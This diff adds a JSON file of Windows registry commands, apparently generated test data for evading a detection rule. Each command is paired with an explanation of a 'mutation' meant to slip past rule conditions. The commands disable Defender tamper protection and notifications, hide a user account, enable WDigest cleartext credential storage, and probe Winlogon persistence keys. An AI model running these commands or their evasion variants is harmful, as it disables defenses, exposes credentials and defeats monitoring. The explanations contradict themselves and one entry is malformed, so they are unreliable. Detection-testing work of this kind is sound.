@@ -1,0 +1,46 @@
+[
+  {
+    "output": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\" /t REG_DWORD /d 0 /f",
+    "explanation": "No mutation technique was used for this command as it does not trigger any avoidable rule conditions. The rule condition 'CommandLine|contains: \\\\' is still met."
+  },
+  {
+    "output": "reg.exe add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v AtomicOperator$ /t REG_DWORD /d 0",
+    "explanation": "Substitution mutation technique was used to replace 'REG' with 'reg.exe' to avoid the rule condition 'OriginalFileName: reg.exe' while still meeting the 'Image|endswith: \'\\reg.exe\'' condition."
+  },
+  {
+    "output": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration\" /v Notification_Suppress /t REG_DWORD /d 1 /f",
+    "explanation": "No mutation technique was used for this command as it does not trigger any avoidable rule conditions. The rule condition 'CommandLine|contains: \\\' is still met."
+  },
+  {
+    "output": "reg add \"HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4\" /v comsxRes /t REG_BINARY /d 72656463616e617279 /f",
+    "explanation": "Insertion mutation technique was used to add quotes around the registry path to avoid the rule condition 'CommandLine|contains: \\\' while still meeting the condition."
+  },
+  {
+    "output": "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f",
+    " "explanation": "Omission mutation technique was used to remove quotes around the registry path to avoid the rule condition 'CommandLine|contains: \\\' while still meeting the condition."
+  },
+  {
+    "output": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f",
+    "explanation": "No mutation technique was used for this command as it does not trigger any avoidable rule conditions. The rule condition 'CommandLine|contains: \\\' is still met."
+  },
+  {
+    "output": "reg add HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f",
+    "explanation": "No mutation technique was used for this command as it does not trigger any avoidable rule conditions. However, the 'HKLM64' may be normalized to 'HKLM' in some systems."
+  },
+  {
+    "output": "reg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"",
+    "explanation": "Insertion mutation technique was used to add an extra backslash at the end of the registry path to avoid the rule condition 'CommandLine|contains: \\\' while still meeting the condition."
+  },
+  {
+    "output": "reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"",
+    "explanation": "Insertion mutation technique was used to add an extra backslash at the end of the registry path to avoid the rule condition 'CommandLine|contains: \\\' while still meeting the condition."
+  },
+  {
+    "output": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"",
+    "explanation": "No mutation technique was used for this command as it does not trigger any avoidable rule conditions. The rule condition 'CommandLine|contains: \\\' is still met."
+  },
+  {
+    "output": "reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"",
+    "explanation": "No mutation technique was used for this command as it does not trigger any avoidable rule conditions. The rule condition 'CommandLine|contains: \\\' is still met."
+  }
+]
